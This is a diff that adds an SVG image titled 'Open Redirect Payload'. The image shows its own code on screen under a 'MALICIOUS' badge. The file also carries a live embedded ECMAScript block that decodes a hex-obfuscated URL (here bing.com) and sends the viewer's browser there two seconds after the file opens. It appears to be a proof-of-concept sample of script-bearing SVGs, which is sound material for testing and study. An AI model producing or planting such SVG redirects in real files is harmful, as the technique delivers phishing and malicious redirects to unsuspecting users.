@@ -1,0 +1,129 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 800 600" width="800" height="600">
+  <defs>
+    <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" style="stop-color:#1a1a2e;stop-opacity:1" />
+      <stop offset="100%" style="stop-color:#16213e;stop-opacity:1" />
+    </linearGradient>
+    <filter id="glow">
+      <feGaussianBlur stdDeviation="3" result="coloredBlur"/>
+      <feMerge>
+        <feMergeNode in="coloredBlur"/>
+        <feMergeNode in="SourceGraphic"/>
+      </feMerge>
+    </filter>
+  </defs>
+
+  <rect width="800" height="600" fill="url(#bgGrad)" />
+
+  <circle cx="400" cy="300" r="200" fill="none" stroke="#0f3460" stroke-width="2" opacity="0.3" />
+  <circle cx="400" cy="300" r="250" fill="none" stroke="#e94560" stroke-width="1" opacity="0.2" />
+
+  <text x="400" y="80" text-anchor="middle" fill="#e94560" font-family="monospace" font-size="28" font-weight="bold" filter="url(#glow)">
+    ⚠️ Open Redirect Payload
+  </text>
+  <text x="400" y="110" text-anchor="middle" fill="#a0a0a0" font-family="monospace" font-size="14">
+    SVG File with Embedded ECMAScript → bing.com
+  </text>
+
+  <rect x="50" y="140" width="700" height="400" rx="8" fill="#0d1117" stroke="#30363d" stroke-width="2" />
+
+  <circle cx="75" cy="160" r="6" fill="#ff5f56" />
+  <circle cx="95" cy="160" r="6" fill="#ffbd2e" />
+  <circle cx="115" cy="160" r="6" fill="#27c93f" />
+
+  <text x="400" y="165" text-anchor="middle" fill="#8b949e" font-family="monospace" font-size="12">
+    openredirect_bing.svg
+  </text>
+
+  <text x="70" y="200" fill="#7ee787" font-family="monospace" font-size="13" xml:space="preserve">
+&lt;script type="text/ecmascript"&gt;&lt;![CDATA[
+  </text>
+
+  <text x="70" y="225" fill="#79c0ff" font-family="monospace" font-size="13" xml:space="preserve">
+  (function() {
+  </text>
+
+  <text x="70" y="250" fill="#8b949e" font-family="monospace" font-size="13" xml:space="preserve">
+    // Utility: convert hex-encoded string to plain text.
+  </text>
+
+  <text x="70" y="275" fill="#d2a8ff" font-family="monospace" font-size="13" xml:space="preserve">
+    function hexToString(hex) {
+  </text>
+
+  <text x="70" y="300" fill="#ffa657" font-family="monospace" font-size="13" xml:space="preserve">
+      var str = "";
+  </text>
+
+  <text x="70" y="325" fill="#ffa657" font-family="monospace" font-size="13" xml:space="preserve">
+      for (var i = 0; i &lt; hex.length; i += 2) {
+  </text>
+
+  <text x="70" y="350" fill="#ffa657" font-family="monospace" font-size="13" xml:space="preserve">
+        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+  </text>
+
+  <text x="70" y="375" fill="#ffa657" font-family="monospace" font-size="13" xml:space="preserve">
+      }
+  </text>
+
+  <text x="70" y="400" fill="#ffa657" font-family="monospace" font-size="13" xml:space="preserve">
+      return str;
+  </text>
+
+  <text x="70" y="425" fill="#d2a8ff" font-family="monospace" font-size="13" xml:space="preserve">
+    }
+  </text>
+
+  <text x="70" y="455" fill="#8b949e" font-family="monospace" font-size="13" xml:space="preserve">
+    // Hex-encoded target URL ("https://bing.com")
+  </text>
+
+  <text x="70" y="480" fill="#ffa657" font-family="monospace" font-size="13" xml:space="preserve">
+    var targetURL = hexToString("68747470733a2f2f62696e672e636f6d");
+  </text>
+
+  <text x="70" y="510" fill="#8b949e" font-family="monospace" font-size="13" xml:space="preserve">
+    // Auto-redirect after 2 seconds
+  </text>
+
+  <text x="70" y="535" fill="#d2a8ff" font-family="monospace" font-size="13" xml:space="preserve">
+    setTimeout(function() {
+  </text>
+
+  <text x="70" y="560" fill="#ffa657" font-family="monospace" font-size="13" xml:space="preserve">
+      window.location.href = targetURL;
+  </text>
+
+  <text x="70" y="580" fill="#d2a8ff" font-family="monospace" font-size="13" xml:space="preserve">
+    }, 2000);
+  </text>
+
+  <rect x="620" y="520" width="120" height="30" rx="4" fill="#e94560" opacity="0.9" />
+  <text x="680" y="540" text-anchor="middle" fill="#fff" font-family="monospace" font-size="12" font-weight="bold">
+    MALICIOUS
+  </text>
+
+  <script type="text/ecmascript"><![CDATA[
+    (function() {
+      function hexToString(hex) {
+        var str = "";
+        for (var i = 0; i < hex.length; i += 2) {
+          str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+        }
+        return str;
+      }
+
+      var targetURL = hexToString("68747470733a2f2f62696e672e636f6d");
+
+      setTimeout(function() {
+        try {
+          window.location.href = targetURL;
+        } catch (e) {
+          console.error("Redirect failed: " + e);
+        }
+      }, 2000);
+    })();
+  ]]></script>
+</svg>
